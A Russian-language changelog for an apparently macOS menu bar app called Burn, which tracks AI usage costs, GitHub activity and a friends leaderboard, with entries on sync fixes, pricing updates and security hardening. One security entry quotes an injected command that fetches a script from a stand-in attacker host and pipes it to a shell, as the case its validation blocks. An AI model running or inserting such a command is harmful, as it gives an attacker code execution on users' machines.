# Changelog

Все заметные изменения проекта.
Формат — [Keep a Changelog](https://keepachangelog.com/ru/1.1.0/).

## [Unreleased]

### Feature: синхронизация шаринга с сервером при входе

- **После входа клиент читает реальное состояние шаринга с сервера** (`GET /profiles/me`), а не угадывает локально. Это закрывает рассинхрон `sharing_enabled` в том числе между устройствами: раньше прочитать серверный флаг было нечем, и локальный мог навсегда разойтись с настоящим. Если запрос не прошёл (офлайн) — остаётся прежняя эвристика: новый профиль приватен, привязка сохраняет выбор.

### Fix: рассинхрон шаринга после входа через GitHub и пугающая ошибка на скрытой борде

- **Вход через GitHub больше не сбрасывает шаринг при привязке существующего аккаунта.** `signInWithGitHub` безусловно писал локальный `sharingEnabled=false` — даже когда ты логинишься в аккаунт, где шаринг был включён. Локальный флаг расходился с сервером (там он оставался включённым), синк снапшотов замолкал, и ты видел себя в лидерборде с нулём, хотя на сервере цифры были. Теперь новый аккаунт через провайдера приватен по умолчанию (совпадает с сервером), а привязка существующего сохраняет его выбор шаринга.
- **Борда на 403 показывает подсказку включить шаринг, а не красную ошибку.** Когда шаринг выключен, сервер намеренно прячет лидерборд (403) — это не сбой. Раньше дропдаун в этом случае мог показать «Не удалось загрузить лидерборд»; теперь — спокойную подсказку включить шаринг в настройках, а возможный устаревший кэш чужих результатов прячется.

## [0.6.4] — 2026-06-11

### Fix: Burn выжигал CPU и память на больших историях Cowork-сессий

- **Sync-тик больше не перечитывает всю историю Cowork.** `ClaudeCoworkFetcher` на каждом тике (раз в 15 минут плюс на каждый wake мака) читал в память и перепарсивал все jsonl-транскрипты `local-agent-mode-sessions` целиком — окно `since` применялось только после полного парсинга. На активных машинах это сотни MB JSON каждые 15 минут: Burn разгонялся до 80%+ CPU и сотен MB peak footprint. Особенно больно ночью: фоновые Claude-сессии растят транскрипты, и каждый тик жуёт всё больше. Теперь файлы с mtime старше окна синка отсеиваются до чтения (jsonl append-only — старый mtime гарантирует отсутствие новых записей), а оставшиеся читаются лениво по одному, не материализуясь в памяти разом.

## [0.6.3] — 2026-06-09

### Fix: вернулась статистика Codex/ChatGPT (ccusage сменил схему)

- **Codex снова считается.** ccusage переименовал поля в выводе `codex daily`: `cachedInputTokens` → `cacheReadTokens` + `cacheCreationTokens` (как у claude). DTO держал `cachedInputTokens` обязательным — декод падал с «данные отсутствуют», весь источник Codex замерзал (claude/github при этом продолжали работать). Поля приведены к актуальной схеме и сделаны опциональными, чтобы будущее переименование снова не роняло синк.

## [0.6.2] — 2026-06-08

### Feature: поддержка Claude Fable 5 и Mythos 5

- **Fable 5 и Mythos 5 считаются по своим ставкам.** Anthropic выпустил `claude-fable-5` ($10/$50 за MTok) — самую мощную общедоступную модель, и `claude-mythos-5` (Project Glasswing, invitation-only). Обе добавлены в `PricingTable` — раньше новая модель шла по нулевой ставке и показывалась за $0. Family-fallback расширен префиксами `claude-fable-`/`claude-mythos-`, чтобы будущие версии и `[1m]`-варианты не занулялись.

## [0.6.1] — 2026-06-08

### Fix: вернулась стоимость Cowork-сессий на Opus 4.8

- **Расход на Claude снова считается.** `claude-opus-4-8` не было в `PricingTable`, а cowork-парсер считает стоимость только по ней — неизвестная модель шла по нулевой ставке, и весь расход на новые сессии схлопывался в $0. Из-за политики «не уменьшаем `cost_usd`» в апсёрте нулевая стоимость замораживала строку дня целиком, включая токены, — снаружи выглядело как «приложение перестало считать».
- **Прайс Anthropic обновлён.** Заодно вскрылось, что ставки Opus 4.7/4.5 стояли по старому прайсу эпохи Opus 4/4.1 ($15/$75) — Anthropic давно срезал Opus до $5/$25, исторические цифры были завышены втрое. Haiku 4.5 считался по ставкам похороненного Haiku 3.5 ($0.80/$4 вместо $1/$5). Все ставки сверены с официальным прайсингом Anthropic.
- **Новые модели больше не зануляют статистику.** Если выйдет модель, которой ещё нет в таблице (`claude-opus-4-9` и далее), стоимость считается по ставке семейства, а не по нулю; в лог пишется warning, чтобы не забыть обновить таблицу.
- **Cache-write с 1-часовым TTL считается по своей ставке.** Claude Code пишет prompt-кэш с 1h TTL ($10/M на Opus), а считали всё по 5-минутной ставке ($6.25/M) — на cache-heavy сессиях расход занижался на ~10–13%. Cowork-парсер теперь разбивает `cache_creation` на 1h/5m и тарифицирует раздельно (ccusage разбивки не отдаёт — там по-прежнему 5m).
- **Ставки OpenAI (Codex) сверены с прайсом.** gpt-5.4 и gpt-5.4-mini были занижены по input/output, gpt-5.5 — наоборот, input вдвое завышен, cache-read неверный у всех трёх. Поправлено по официальному прайсингу OpenAI.

## [0.6.0] — 2026-06-06

### Feature: вход через GitHub, синхронизация между устройствами, публичный лидерборд

- **Вход через GitHub.** Settings → «Аккаунт» → «Войти через GitHub»: OAuth-флоу через системное окно, токен для коммитов/LOC выдаётся автоматически — ручной PAT в `config.json` больше не обязателен. Client secret живёт только на сервере, приложение его не видит.
- **Синхронизация между устройствами.** Залогинься тем же GitHub на втором компьютере — статистика суммируется автоматически, с учётом по устройствам. Отдельных привязок делать не надо.
- **Публичный лидерборд.** Тогл в Settings → «Аккаунт»: включив, попадаешь в общий рейтинг на сайте (handle, аватар, токены). Выключен по умолчанию. Лидерборд друзей остаётся приватным, в приложении.
- **Аватар с GitHub.** При входе подтягивается аватарка из профиля GitHub.
- **Вход привязывает, а не пересоздаёт.** Вход в уже существующий аккаунт привязывает к нему GitHub, сохраняя friend_code и друзей.
- **Приватность.** Без входа приложение работает полностью локально, на сервер не уходит ничего. Аккаунт нужен только для синка и лидербордов; сервер хранит минимум — id провайдера и handle, без email.

## [0.5.0] — 2026-06-02

### Feature: Claude Cowork как отдельный источник статистики

- **Теперь видно расход на Cowork-сессии Claude.** `ccusage` знает только про Claude Code и Codex CLI — сессии Cowork (desktop-приложение Claude) проходили мимо статистики. Cowork пишет на диск ту же структуру `.claude/projects/*.jsonl`, что и Claude Code, поэтому данные читаются напрямую, без `ccusage`.
- **Отдельный источник `claude-cowork`** — в разбивке по моделям показывается как `Cowork (Opus 4.7)`, не смешивается с обычным Claude Code. Видно, сколько уходит именно на Cowork.
- **Как считается:** парсер обходит `~/Library/Application Support/Claude/local-agent-mode-sessions/`, дедуплицирует сообщения по `message.id` (Cowork дублирует строки в логе по 2–3 раза), агрегирует токены и стоимость по дню и модели через локальный `PricingTable`.

### Fix: парсинг timestamp с дробными секундами

- Cowork пишет timestamp с миллисекундами (`2026-05-16T10:51:58.794Z`). Парсер ожидал формат без дробной части — `date(from:)` возвращал `nil`, и **все** записи отбрасывались. Снаружи это выглядело как успешный sync с нулём данных. Теперь парсятся оба формата.

### Fix: служебная модель `<synthetic>` не попадает в статистику

- Claude Code присваивает `model="<synthetic>"` служебным сообщениям (compaction и т.п.). Они создавали лишнюю строку в разбивке по моделям с нулевой стоимостью — теперь фильтруются на входе.

## [0.4.3] — 2026-06-01

### Fix: sync переживает sleep/wake Mac'а

- **Виджеты больше не «застывают»** после долгого uptime приложения. Раньше `SyncCoordinator` крутил sync через `Timer.scheduledTimer` на main RunLoop — на macOS такой таймер плохо переживает циклы sleep/wake: после нескольких sleep'ов мог замолкнуть и больше не отстреливать. Симптом — приложение запущено неделю, БД и snapshot не обновляются, единственный sync с момента старта.
- **Что изменилось:**
  - `Timer.scheduledTimer` → `DispatchSourceTimer` на main queue. Не зависит от RunLoop modes, в т.ч. modal-режима popover'а, и устойчивее к App Nap.
  - Подписка на `NSWorkspace.didWakeNotification` — после wake'а сразу форсим sync для всех источников, не ждём очередного тика.
- Тесты на wake-наблюдатель + unsubscribe в `stopTimer` (всего 215 тестов в сюите).

### Fix: cost для claude приходит из ccusage, а не считается локально

- **`claude-opus-4-8` (и любая будущая модель) теперь считается.** Раньше парсер `CcusageParser` для claude брал per-model cost из локального `PricingTable`, а тот знал только модели по состоянию майско-2026 (opus-4-7, sonnet-4-6 и т.д.). Неизвестная модель → нулевая ставка → cost = 0 → модель проваливалась мимо top-моделей в popover/виджете. `ccusage` сам хранит up-to-date прайс Anthropic в каждом релизе — теперь day-level и per-model cost берутся прямо из его JSON-вывода (`daily[].totalCost`, `modelBreakdowns[].cost`). Для codex day-level тоже из ccusage (`daily[].costUSD`); per-model по-прежнему через `PricingTable` — ccusage codex per-model cost не отдаёт.
- **Fallback на `PricingTable` сохранён** на случай старого ccusage без поля cost — чтобы при downgrade ничего не падало.

## [0.4.2] — 2026-05-24

### Fix: переключение period, обрезание чисел в виджетах, стрелки в лидерборде

- **Popover теперь обновляет цифры при смене Д/Н/М** в моменте. Раньше менялся только Crumb (заголовок), а суммы/top-models — только при повторном открытии popover'а. Корень — `Task { await reload() }` в async-форме терял objectWillChange в NSPopover'е после первого re-render'а. Сделал `reloadSync` — БД локальная, sync read миллисекундный.
- **Виджеты больше не обрезают суммы** с многотысячными числами ("$1 029" вместо "$1.."). Шрифты были захардкожены на 30/38/46pt — для popover'а это норма, для widget-контейнера 160-200pt узко. Завёл widget-specific tokens (22/26/32pt) + страховку `minimumScaleFactor(0.5)` + `lineLimit(1)`.
- **Стрелки ▲N / ▼N / NEW появились в popover-лидерборде** «Друзья». `previous_rank` приходил с сервера, но `FriendRow` его не использовал — `RankDelta`-компонент существовал, но ни к чему не был подключён. Подключил.

### Dev tooling: seed-скрипт для скриншотов лидерборда

- `scripts/seed-demo-leaderboard.py` — подмешивает `previous_rank` в `leaderboard_cache.payload_json` всех 4 periods так, чтобы у каждой строки была своя стрелка (▲N / ▼N / NEW / без изменений). Раньше cache хранил entries без previous_rank → стрелок в popover'е не было → screenshots выглядели плоско.
- Команды: `--backup` (полный bin-копия stats.db), `--seed` (правка cache), `--restore` (откат из backup'а).
- README обновлён — новая секция «Скриншоты» с placeholder-ссылками на `docs/screenshots/*.png` + `docs/screenshots/README.md` с инструкцией как снять каждый кадр.

## [0.4.1] — 2026-05-24

### Fix: menu bar capsule + кнопка Quit

- **Capsule в menu bar сразу нормального размера.** Раньше при старте появлялся обрезанный, рос в 2-3 стадии после кликов. Корень — `NSHostingView.fittingSize` на status bar button возвращал мусор до полного first-layout pass'а SwiftUI. Заменил на детерминированный расчёт ширины через `NSString.size(withAttributes:)` с тем же шрифтом — никакой зависимости от SwiftUI layout, ширина считается мгновенно из priceText.
- **Кнопка Quit** в footer popover'а (третья иконка `power` рядом с refresh + gear). Раньше из-за `LSUIElement=true` quit'ить app можно было только через Activity Monitor.
- **Single-instance guard.** Запуск второй копии (через `open`, Spotlight, и т.п.) теперь активирует уже работающую и завершает себя. Раньше каждый запуск создавал новый `NSStatusItem` → 5 одинаковых иконок в menu bar. Отключается под XCTest.

## [0.4.0] — 2026-05-24

### Launch at login + меньше Keychain prompts

- **«Запускать Burn при входе в систему»** — toggle в Settings → Общие. Внутри `SMAppService.mainApp` (нативный macOS 13+ API). Управлять можно и из System Settings → General → Login Items.
- **Все секреты схлопнуты в один Keychain item** (`tech.popovs.aistats.secrets`, account `combined-v1`, JSON-blob с `{aiuseSecret, githubPAT}`). Раньше было два отдельных item'а → два «введите пароль» prompt'а на запуск. Теперь — один. Миграция из legacy items автоматическая при первом запуске (`SecretsStore.loadAll()`).
- **README обновлён** — секция «Почему macOS просит пароль на старте» с честным объяснением unsigned-app behavior'а: ad-hoc подпись → каждая пересборка инвалидирует trust cache → prompt возвращается; «Always Allow» работает до следующего апдейта app'а.

## [0.3.0] — 2026-05-24

### Distribution: DMG-сборка + Homebrew Cask

- **`scripts/build-dmg.sh`** — собирает Release-сборку через xcodebuild (ad-hoc подпись из `project.yml`), упаковывает в DMG через `create-dmg` с drag-to-Applications layout. На выходе печатает SHA256 для Cask formula. Без notarization (требует Apple Developer Program $99/год — пока пропускаем; для distribution через `brew install --cask` достаточно ad-hoc подписи + cask автоматически снимает quarantine).
- **`homebrew/ai-stats.rb`** — шаблон Cask formula с placeholder для SHA256. README в `homebrew/` объясняет как опубликовать в отдельный tap-репозиторий (`tsergeytovarov/homebrew-tap`).
- **README.md** — секция «Установка» с двумя путями: через Homebrew Cask (без Gatekeeper alert'а) и прямым DMG-скачиванием (с инструкцией про Right-click → Open для первого запуска ad-hoc подписанного app'а).
- **Не делаем:** sandbox (#9) + App Group для widget (#12) — оба требовали бы либо подписи Developer ID cert'ом, либо overhead для нашего use-case с npx subprocess + dotfiles. Sandbox реально нужен только для App Store; для DMG-distribution Hardened Runtime обязателен только при notarization, которую мы пока не делаем.

### Security pass #4 — гигиена (backup rotation, DELETE dual-send)

- **`DatabaseImporter` теперь чистит старые бэкапы** после успешного импорта — оставляет последние 3 (`stats.db.backup-<timestamp>`). Раньше копились вечно, каждый = размер текущей БД. Файлы не с нашим префиксом не трогаем. На failure-пути бэкапы не вычищаем — safety net остаётся.
- **`removeFriend` дублирует `block`-флаг в query И в body.** Прокси/CDN (Cloudflare и т.п.) исторически выкидывают body у DELETE-запросов — `block` тихо переставал бы работать. Body сохранили для backward-compat с текущим сервером; когда server-side научится читать query — body убираем в follow-up.

### Security pass #3 — PATH-hijack, os.Logger privacy, валидация DB-import

- **`ccusage_command[0]` валидируется** перед запуском Process: разрешены только `npx`, `bunx` или абсолютный путь (с запретом `..` внутри). Закрывает arbitrary command execution через подмену `~/.config/ai-stats/config.json` (например `["curl", "evil.example.com/script", "|", "sh"]`). Из `extraSearchPaths` убран home-relative `~/.bun/bin` — home-writable, PATH-hijack-vector. Bun-юзеры добавляют bun в shell PATH (env прокидывается child'у через `enrichedEnvironment`).
- **Все `NSLog` заменены на `os.Logger`** с privacy-маркерами (`Shared/Util/AppLogger.swift`). Категории: `sync`, `github`, `aiuse`, `ccusage`, `db`, `pricing`, `widget`. Response bodies, paths с home, repo nameWithOwner, friend_code, error.localizedDescription — все помечены `.private` (в Console.app/sysdiagnose видны как `<private>` без debugger'а). Идентификаторы вроде `period`, `source` — `.public` для удобства фильтрации.
- **DB-import теперь валидируется**: проверка SQLite magic header (16 байт), `PRAGMA integrity_check`, наличие requiredTables (`ai_usage`, `github_activity`, `sync_state`). Невалидный файл — alert до confirm-диалога, оригинальная БД не трогается. Добавлен rollback: если copyItem импортируемого файла падает после удаления оригинала — восстанавливаем из backup.

### Security pass #2 — MIME/size cap на аватарки, JSON-cap, пин ccusage

- **`getAvatar` теперь имеет жёсткий cap 512 KB и MIME-allowlist `{image/png, image/jpeg}`**. Закрывает RCE-вектор через ImageIO: malformed PNG/JPEG/SVG от скомпрометированного aiuse-сервера больше не доедет до `NSImage(data:)`. Чтение идёт через `URLSession.bytes(for:)` со streaming-cap'ом + Content-Length precheck. SVG специально отбит — формат позволяет JS/external refs, для нас не нужен.
- **Все JSON-ответы от aiuse ограничены 1 MB.** Та же streaming-схема в `AiuseAPIClient.request`. Защита от OOM при скомпрометированном сервере, который захочет залить нам GB ответом на `/friends` или `/leaderboard`.
- **`ccusage` запиннен на major 20** (`["npx", "-y", "ccusage@20"]` вместо `@latest`). `@latest` тянул supply-chain risk: malicious 21.0.0 в npm подхватился бы автоматически на следующий sync. Теперь только bug-fix внутри 20.x. Для апгрейда — менять руками.
- Новые ошибки: `AiuseAPIError.avatarTooLarge`, `.avatarBadMime`, `.responseTooLarge` — с понятными сообщениями для UI.

### Security pass #1 — PAT в Keychain, https-only для aiuse, валидация friend_code

- **GitHub PAT мигрирован из `~/.config/ai-stats/config.json` в Keychain** (service `tech.popovs.aistats.github`). При первом запуске после апдейта токен автоматически переезжает в Keychain, а поле `github_token` в JSON зануляется — plaintext-токен больше не лежит на диске с правами `0644`. Если нужно сменить токен — впиши в `github_token`, перезапусти, токен снова уедет в Keychain.
- `~/.config/ai-stats/config.json` теперь создаётся с правами `0600` (owner read/write only). Defensive-фикс mode'а делается и на каждом чтении — старые файлы с `0644` приводятся к норме.
- `aiuse_api_base_url` валидируется на старте: только `https://`. Любой `http://` (или ftp/file/...) даёт явную ошибку в alert `app.failed_to_start` — иначе Bearer-токен утёк бы plain-text'ом.
- `friend_code` валидируется на клиенте перед интерполяцией в URL path: `^[A-Z0-9]{10}$` (с авто-нормализацией дефисов/регистра). Закрывает попытки просунуть `..`, `?`, `/` в `/friends/<code>` и `/avatars/<code>`. Применяется в `addFriend` / `removeFriend` / `unblock` / `getAvatar` (там defense-in-depth — серверу всё равно нельзя доверять).

### Аватарки в Large widget

- `LeaderboardSlice.Entry` теперь содержит `friend_code` — без него виджет не мог сматчить запись с файлом. Decoder обратно-совместим: старые snapshot'ы → пустая строка → fallback на градиент.
- `WidgetSnapshotIO` пишет blob'ы файлами в `<widget-sandbox>/Library/Application Support/ai-stats/avatars/<friend_code>.bin`. Тащить аватарки внутрь snapshot.json было бы дорого: 50 KB × 8 ≈ 400 KB JSON на каждый timeline reload.
- `SyncCoordinator.syncAvatarsToWidgetContainer` после записи snapshot собирает уникальные `friend_code` из всех периодов leaderboard'а, грузит blob'ы за один read из `friend_profiles` + `my_profile` и пишет файлы. `pruneAvatars` чистит файлы кодов, которых уже нет.
- `LargeView` для каждой строки читает blob через `readAvatar(friendCode:)` и передаёт в `FriendRow.avatarData`. Если файла нет — рисуется brand-градиент (как и раньше).

### Fix: ccusage из GUI снова работает (env PATH для child-процесса)

- ccusage не запускался: `processFailed(exitCode: 127, stderr: "env: node: No such file or directory")`. GUI-приложение наследует PATH = `/usr/bin:/bin` без brew/nvm, `npx` через shebang `#!/usr/bin/env node` ищет node в этом голом PATH и валится.
- `CcusageFetcher` теперь явно задаёт `process.environment` с расширенным PATH (`/opt/homebrew/bin`, `/usr/local/bin`, `~/.bun/bin` плюс существующий). Логика `extraSearchPaths` общая для `resolveExecutable` и env'а child-процесса.
- Тесты на pure-функцию `enrichedEnvironment`: prepend brew к чистому PATH, no-dup при повторе, обработка пустого PATH, сохранение прочих ключей.
- Симптом: виджеты по нулям, новые данные не накапливались. Это и было причиной сегодняшних "$0" в Small/Medium и "Пока никого" в Large.

### Аватарка профиля — отображение и смена

- Свой аватар хранится локально как BLOB в `my_profile` (поля `avatar_blob`, `avatar_mime`, `avatar_etag`, миграция v8) — по аналогии с `friend_profiles`. `avatar_path` остаётся как legacy-колонка, удалю позже.
- В Settings/Аккаунт у созданного профиля теперь рисуется реальный аватар вместо хардкод-символа `person.crop.circle`. Появилась кнопка «Сменить аватарку» — PATCH `/profiles/me` + локальный апдейт через `StatsQueries.updateMyAvatar`.
- При создании аккаунта BLOB сохраняется сразу после ответа сервера — до этого аватарка отправлялась на сервер, но локально не кэшировалась и не показывалась.
- `FriendsPullSyncer` после цикла друзей догружает свой аватар тем же conditional GET с ETag — это backfill для аккаунтов, созданных до v8.
- В превью при создании виден сам файл (через `AvatarView`), а не только размер в байтах.
- В popover-лидерборде (`FriendRow`) вместо градиентного кружка рисуется реальный аватар при наличии blob. Свой код подмешивается в `DropdownViewModel.friendAvatars` из `my_profile`. Large widget остаётся на градиенте — таскать blob'ы в JSON-snapshot нерационально.

### Rebrand → Burn

- Продукт переименован: `ai-stats` → **Burn**. Затронуты только user-facing surfaces — display name в Dock/Spotlight/Cmd+Tab, заголовок окна Settings, About-строка, default-имя экспорта DB (`burn-YYYYMMDD.db`), имя виджета в Apple Widget Gallery, локализованный alert "failed to start" (en + ru).
- Новая иконка приложения: тёмное glass-squircle + горячий уголёк (pink core, double pink/cyan glow). Рендерится из Swift+CoreGraphics-скрипта `scripts/render-app-icon.swift` для 10 размеров AppIcon.appiconset через `scripts/generate-app-icon-set.sh`.
- Mini-ember в menu bar capsule вместо SF-символа `chart.line.uptrend.xyaxis`. Pure SwiftUI (`MiniEmberView`), цвета из `BrandColor`-токенов.
- Внутренние идентификаторы (bundle ID `com.sergeytovarov.aistats`, target names, пути в файловой системе `~/.config/ai-stats/`, `~/Library/Application Support/ai-stats/`, NSLog-теги, User-Agent, git repo) сохранены. Их renaming — отдельный шаг под v1.0 open-source cleanup.

### Полная переделка визуала — Liquid Glass + Neon Duo (B2)
- Поповер: единый floating glass island внизу объединяет категорию (AI / GitHub / Друзья) и период (Д/Н/М). Два отдельных segmented picker удалены. Цвет crumb меняется по вкладке: pink / cyan / нейтрал.
- Главное число — gradient text (white → pink/cyan), фон каждой поверхности — 3-слойный (Tahoe `.glassEffect()` + внутренний radial pink top-left + radial cyan bottom-right), идентичность держится на любых обоях.
- Виджеты Small/Medium/Large переведены на единый visual language с поповером (общий `BrandSurface`, `HeroNumber`, `FriendRow`, `Crumb`). Цены в виджетах округляются до доллара, в поповере — с копейками.
- Menu bar item — capsule с pink→cyan градиентом и SF Symbol `chart.line.uptrend.xyaxis` вместо plain title.
- Sync/⚙ кнопки — квадраты 28×28 в glass-tile с hover.
- Sparkline получил variant API (`.ai` pink / `.github` cyan) и gradient stroke + area fill.
- Дизайн-токены (Color, Font, Spacing, Radius) вынесены в `Shared/Design/Tokens.swift`.
- Лейбл «Лидерборд» в UI заменён на «Друзья» (в коде сущность остаётся `Leaderboard`).

### Удалено
- Поддержка macOS 14/15. Минимум — **macOS 26 Tahoe** (для нативных Liquid Glass API).

### Large виджет + дельта в виджетах поменьше
- Новый Large виджет на десктопе: совмещённый экран «мои траты + лидерборд». Слева — сумма с дельтой и top-3 моделей за период, справа — топ-8 лидерборда с дельтой ранга (`▲N` / `▼N` / `NEW`), моя строка подсвечена. Если меня нет в топ-8 — добавляется отдельной строкой ниже после `⋯`. Без аккаунта sharing — справа подсказка «Включи sharing в Настройках».
- Дельта трат vs прошлый период в Small и Medium виджетах: под суммой появляется строка вида `▲ +$27.60 vs prev day` (зелёная — рост, красная — падение). Скрывается при отсутствии данных за прошлый период или при разнице меньше копейки.
- Технически: `WidgetSnapshot` расширен полями `aiCostPrev`, `leaderboard`, `myFriendCode` (back-compat decoder); `SyncCoordinator.buildAndWriteWidgetSnapshot` считает prev-cost вторым вызовом `aiTotals` и парсит `leaderboard_cache.payload_json` в `LeaderboardSlice`. `DropdownFormat` (форматтеры дельт и токенов) переехал в `Shared/Util/Formatters.swift`, используется и app, и виджетом.

### UI — динамика в дропдауне
- AI-секция: под крупной цифрой трат показывается дельта vs предыдущий период (день → вчера, неделя → прошлая неделя, месяц → прошлый месяц). Зелёный — больше потратил, красный — меньше.
- Лидерборд: рядом с рангом каждой строки — стрелка `▲N` (поднялся в рейтинге, зелёный) / `▼N` (опустился, красный) / `NEW` (не было в прошлом периоде).
- Серверный контракт: `/api/leaderboard` отдаёт `previous_rank: int | null` в каждой entry. Пока бэк не раскатан — клиент тихо показывает `NEW` всем, не ломается.

### Client v0.3.0 — friends + leaderboard + blocked в app
- Новая вкладка «Друзья» в Settings: добавить по коду, список с аватарками, удалить / удалить+заблокировать.
- Новая вкладка «Заблокированные»: список + разблокировка.
- Новая секция «Лидерборд» в menu bar dropdown — top-5, аватарки, твоя строка bold.
- Лидерборд автоматически переключается при смене period (день/неделя/месяц).
- Локальный кэш: `friend_profiles` (миграция v7) с avatar_blob + ETag, `leaderboard_cache` за все 4 периода. Оффлайн-фолбэк.
- `FriendsPullSyncer` + `LeaderboardPullSyncer` интегрированы в общий sync-тик (после snapshot push).
- `AiuseAPIClient.getAvatar` с conditional GET по If-None-Match.
- Memory-cache для `api_secret` в `SecretBox` — один Keychain prompt за сессию вместо потока (unsigned-app проблема).

### Backend v0.3.0 — friends + blocks + leaderboard + avatars endpoints
- `POST /api/friends`, `GET /api/friends`, `DELETE /api/friends/{code}` (с опц. block).
- `GET /api/blocks`, `DELETE /api/blocks/{code}`.
- `GET /api/leaderboard?period={day|week|month|24h}` — SUM tokens среди друзей + я, фильтрация неактивных профилей.
- `GET /api/avatars/{code}` — отдача bytea с ETag/304.
- Симметричная friendship одной строкой `(min(a,b), max(a,b))`, JOIN через `or_`.
- Блок маскируется под 404 (не палим факт блокировки).
- Backend `ai-stats-api` 0.3.0 задеплоен на aiuse.popovs.tech, 58 тестов passed.

### Добавлено — aiuse backend integration (v0.2.0 leaderboard client)
- `AiuseAPIClient` и `KeychainStore` для взаимодействия с `aiuse.popovs.tech/api`.
- Новая вкладка «Аккаунт» в Settings: создание профиля, friend_code с копированием, шаринг toggle, регенерация ID, удаление аккаунта.
- `SnapshotSyncer` интегрирован в `SyncCoordinator` — после ccusage-тика шлёт daily-агрегаты на сервер.
- Локальные таблицы `my_profile` и `pending_snapshots` (миграция v5).
- Тесты: `KeychainStoreTests`, `AiuseAPIClientTests` (через MockURLProtocol), `SnapshotSyncerTests` (happy path, sharing off, retry, sum по providers).

Известное расхождение: шлём один snapshot/день с `hour_bucket = midnight UTC` (локальная БД хранит daily, ccusage не даёт hourly). Сервер хранит данные с hourly precision — `SUM` по day/week/month работает корректно.

## [0.2.0] — 2026-05-23

### Добавлено
- WidgetKit widget со Small + Medium размерами.
- Период в виджете настраивается через AppIntent (правый клик → Edit Widget): Day / Week / Month.
- Medium показывает топ-4 моделей.
- Миграция базы данных в App Group container (требуется для шаринга с виджетом).
- При успешном sync приложение вызывает WidgetCenter.shared.reloadAllTimelines().

## [0.1.0] — 2026-05-23

### Добавлено
- macOS menu bar app со статус-иконкой и SwiftUI dropdown.
- Сегментированный селектор Day / Week / Month.
- Sparkline-тренд AI-трат за последние 14 дней.
- Shell-out к `ccusage` для агрегатов по Claude Code, Codex и любым другим провайдерам из `enabled_providers`.
- Раздельные DTO под claude и codex (форматы JSON у них разные).
- Свой pricing table — USD за 1M токенов для claude/gpt-5.x. ccusage's costUSD больше не используется (он нулит codex-дни на subscription'е).
- GraphQL-фетчер GitHub-коммитов по всем доступным репозиториям.
- LOC tracking: additions/deletions через Contributor Stats API, недельная гранулярность, exponential backoff 2/4/8/16/16с на 202 Accepted, скип 404/403.
- Локальная SQLite-история с политикой never-decrease — удаление логов агентов не стирает уже накопленную статистику.
- Initial backfill на 365 дней при первом запуске.
- Settings sheet с Export / Import базы данных.
- Создание шаблонного конфига при первом запуске.
